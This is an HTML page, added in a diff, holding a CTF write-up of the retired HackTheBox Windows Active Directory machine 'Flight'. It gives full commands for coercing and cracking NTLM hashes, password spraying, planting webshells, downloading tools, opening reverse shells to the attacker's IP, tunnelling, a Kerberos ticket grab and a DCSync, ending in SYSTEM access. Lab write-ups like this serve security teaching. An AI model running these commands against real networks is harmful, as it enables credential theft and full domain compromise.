@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Flight &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Flight</h1>
+    <div class="meta">Target: <code>10.10.14.70</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">subdomainbrute</span><span class="tag">LFI</span><span class="tag">Responder</span><span class="tag">NTLMv2</span><span class="tag">SMB</span><span class="tag">passwordspraying</span><span class="tag">ntlm_theft</span><span class="tag">webshell</span><span class="tag">RunAsCs</span><span class="tag">chisel</span><span class="tag">IIS</span><span class="tag">Rubeus</span><span class="tag">DCSync</span><span class="tag">PSExec</span><span class="tag">impacket</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#subdomain-discovery">Subdomain Discovery</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#lfi-to-ntlmv2-capture-svc-apache">LFI to NTLMv2 Capture (svc_apache)</a><a class="lvl3" href="#password-spraying-s-moon">Password Spraying → s.moon</a><a class="lvl3" href="#ntlm-theft-via-shared-smb-share-c-bum">NTLM Theft via Shared SMB Share → c.bum</a><a class="lvl3" href="#php-webshell-via-web-smb-share-svc-apache">PHP Webshell via Web SMB Share → svc_apache</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#svc-apache-c-bum-runascs">svc_apache → c.bum (RunAsCs)</a><a class="lvl3" href="#c-bum-iis-apppool-via-internal-development-site">c.bum → IIS AppPool via Internal Development Site</a><a class="lvl3" href="#iis-apppool-domain-admin-rubeus-dcsync">IIS AppPool → Domain Admin (Rubeus + DCSync)</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Flight is a hard Windows Active Directory box that chains three distinct techniques before reaching the domain controller. An LFI on a PHP subdomain triggers NTLM authentication to Responder; the captured hash cracks to low-privileged creds; password spraying finds reuse; <code>ntlm_theft</code> files placed in a writable SMB share capture a second user's NTLMv2 hash; that user writes a PHP webshell to the web share. From there RunAsCs pivots to a higher-privileged user who can write to IIS <code>development</code>, leading to an ASPX webshell as <code>IIS AppPool</code>. Rubeus converts that service account ticket into a Kerberos-based DCSync against the domain controller, recovering the Administrator NTLM hash.</p>
+<h2 id="recon">Recon</h2>
+<p>Nmap revealed a domain controller profile: Kerberos, LDAP, DNS, SMB all present. The web server ran Apache with PHP. Adding <code>flight.htb</code> to <code>/etc/hosts</code> and running GoBuster against the main site found only static content.</p>
+<h3 id="subdomain-discovery">Subdomain Discovery</h3>
+<pre><code class="language-sh">wfuzz -u http://10.129.228.120 -H &quot;Host: FUZZ.flight.htb&quot; \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 7069
+# school  -&gt; 200
+</code></pre>
+<p><code>school.flight.htb</code> runs a PHP app with a <code>?view=</code> parameter that triggers outbound requests, a clear LFI/RFI pattern.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="lfi-to-ntlmv2-capture-svc-apache">LFI to NTLMv2 Capture (svc_apache)</h3>
+<p>Sending an SMB path in the <code>view</code> parameter caused the server to authenticate against Responder:</p>
+<pre><code class="language-sh">sudo responder -I tun0
+# then browse to:
+# http://school.flight.htb/index.php?view=//10.10.14.70/test
+</code></pre>
+<pre><code class="language-sh">[SMB] NTLMv2-SSP Username : flight\svc_apache
+[SMB] NTLMv2-SSP Hash     : svc_apache::flight:624951a5b5fafe7c:AC8870AE...
+</code></pre>
+<blockquote>
+<p><strong>Why SMB paths trigger NTLM auth:</strong> when PHP (or the OS) tries to open a UNC path (<code>\\host\share</code>), Windows transparently attempts SMB authentication. That authentication sends an NTLMv2 challenge-response hash that Responder captures. The hash can then be cracked offline.</p>
+</blockquote>
+<pre><code class="language-sh">john hash --wordlist=/usr/share/wordlists/rockyou.txt
+‹redacted›     (svc_apache)
+</code></pre>
+<p>Credentials: <code>svc_apache:‹redacted›</code></p>
+<h3 id="password-spraying-s-moon">Password Spraying → s.moon</h3>
+<p>With a user list from SMB enumeration, spraying <code>svc_apache</code>'s password found reuse:</p>
+<pre><code class="language-sh">nxc smb flight.htb -u users.txt -p '‹redacted›' --continue-on-success
+[+] flight.htb\svc_apache:‹redacted›
+[+] flight.htb\s.moon:‹redacted›
+</code></pre>
+<p><code>s.moon</code> had <strong>write access</strong> to the <code>Shared</code> SMB share.</p>
+<h3 id="ntlm-theft-via-shared-smb-share-c-bum">NTLM Theft via Shared SMB Share → c.bum</h3>
+<p>Using <code>ntlm_theft.py</code> to generate credential-triggering files, then uploading the allowed ones to the <code>Shared</code> share while Responder was still running:</p>
+<pre><code class="language-sh">python3 ntlm_theft.py -g all -s 10.10.14.70 -f evil
+sudo smbclient //flight.htb/shared -U s.moon '‹redacted›'
+smb: \&gt; mput *
+</code></pre>
+<p>Several file types were blocked, but <code>desktop.ini</code> and XML files uploaded. Responder caught a new NTLMv2 hash for <code>c.bum</code>:</p>
+<pre><code class="language-sh">[SMB] NTLMv2-SSP Username : flight.htb\c.bum
+[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:32c90507829f0229:CB62C540...
+</code></pre>
+<pre><code class="language-sh">john hash --wordlist=/usr/share/wordlists/rockyou.txt
+‹redacted›     (c.bum)
+</code></pre>
+<p>Credentials: <code>c.bum:‹redacted›</code></p>
+<blockquote>
+<p><strong>ntlm_theft in a browsed share:</strong> when a Windows user opens a folder containing certain file types (<code>.scf</code>, <code>desktop.ini</code>, Office files with remote templates), the OS automatically fetches embedded resources. If those resources point to an attacker's SMB server, NTLM authentication fires silently.</p>
+</blockquote>
+<h3 id="php-webshell-via-web-smb-share-svc-apache">PHP Webshell via Web SMB Share → svc_apache</h3>
+<p><code>c.bum</code> had <strong>write access</strong> to the <code>Web</code> SMB share, which backed <code>school.flight.htb</code>. Uploading a PHP webshell:</p>
+<pre><code class="language-sh">smbclient //flight.htb/web -U c.bum '‹redacted›'
+smb: \school.flight.htb\&gt; put webshell.php
+</code></pre>
+<p>PoC:</p>
+<pre><code class="language-sh">http://school.flight.htb/webshell.php?cmd=dir
+# Volume in drive C has no label.
+# Directory of C:\xampp\htdocs\school.flight.htb
+</code></pre>
+<p>Executed a base64-encoded PowerShell reverse shell, landing as <code>flight\svc_apache</code>.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="svc-apache-c-bum-runascs">svc_apache → c.bum (RunAsCs)</h3>
+<p><code>svc_apache</code> had limited permissions. RunAsCs allowed executing a new shell as <code>c.bum</code> with known credentials:</p>
+<pre><code class="language-powershell">iwr -uri http://10.10.14.70/RunasCs.exe -OutFile r.exe
+.\r.exe c.bum ‹redacted› -r 10.10.14.70:443 cmd
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+C:\Windows\system32&gt; whoami
+flight\c.bum
+</code></pre>
+<h3 id="c-bum-iis-apppool-via-internal-development-site">c.bum → IIS AppPool via Internal Development Site</h3>
+<p>Chisel forwarded an internal HTTP service on port 8000:</p>
+<pre><code class="language-sh"># Kali
+./chisel server -p 8000 --reverse
+# Target
+.\chisel.exe client 10.10.14.70:8000 R:8001:127.0.0.1:8000
+</code></pre>
+<p>Browsing <code>http://127.0.0.1:8001</code> showed an IIS site. <code>c.bum</code> is in the <code>Web Devs</code> group, granting write access to <code>C:\inetpub\development\</code>. Uploading an ASPX webshell and running <code>nc.exe</code> through it:</p>
+<pre><code class="language-sh"># in webshell arguments field:
+/c \programdata\nc.exe -e cmd 10.10.14.70 139
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 139
+c:\windows\system32\inetsrv&gt; whoami
+iis apppool\defaultapppool
+</code></pre>
+<h3 id="iis-apppool-domain-admin-rubeus-dcsync">IIS AppPool → Domain Admin (Rubeus + DCSync)</h3>
+<p><code>IIS AppPool\DefaultAppPool</code> is a machine account context. Cracking its NTLMv2 hash is not practical (machine account passwords are random and long). Instead, Rubeus was used to obtain a delegated Kerberos ticket:</p>
+<pre><code class="language-sh">.\rubeus.exe tgtdeleg /nowrap
+</code></pre>
+<p>The ticket was converted to ccache format and loaded as the Kerberos environment variable:</p>
+<pre><code class="language-sh">echo '&lt;base64 ticket&gt;' | base64 -d &gt; ticket.kirbi
+python3 kirbi2ccache.py ticket.kirbi ticket.ccache
+export KRB5CCNAME=ticket.ccache
+</code></pre>
+<p>Clock sync was required before running secretsdump:</p>
+<pre><code class="language-sh">sudo timedatectl set-ntp off
+sudo rdate -n 10.129.228.120
+sudo impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user administrator
+</code></pre>
+<pre><code>Administrator:500:‹redacted›:‹redacted›:::
+</code></pre>
+<blockquote>
+<p><strong>Why tgtdeleg works from IIS AppPool:</strong> machine accounts (including IIS AppPool identities) can request Kerberos tickets for their own delegation. <code>tgtdeleg</code> obtains a usable TGT for the machine account. Because machine accounts are domain-joined and trusted, that ticket can be used to request a DCSync-capable session against the DC.</p>
+</blockquote>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">impacket-psexec administrator@flight.htb -hashes ‹redacted›:‹redacted›
+C:\Windows\system32&gt; whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop&gt; type root.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>PHP <code>?view=</code> parameters that trigger outbound requests can coerce NTLM hashes.</strong> Send a UNC path to Responder rather than a local file path.</li>
+<li><strong>Password reuse is common across service and user accounts.</strong> Always spray cracked creds against the full user list before moving on.</li>
+<li><strong><code>desktop.ini</code> in a browsed SMB share triggers NTLM auth silently.</strong> Of all the <code>ntlm_theft</code> file types, folder-browsed formats like <code>desktop.ini</code> work with minimal user interaction.</li>
+<li><strong>IIS AppPool accounts can obtain Kerberos tickets.</strong> Rubeus <code>tgtdeleg</code> turns a limited web-process context into domain-authenticated Kerberos material, enabling DCSync without needing a plaintext password.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
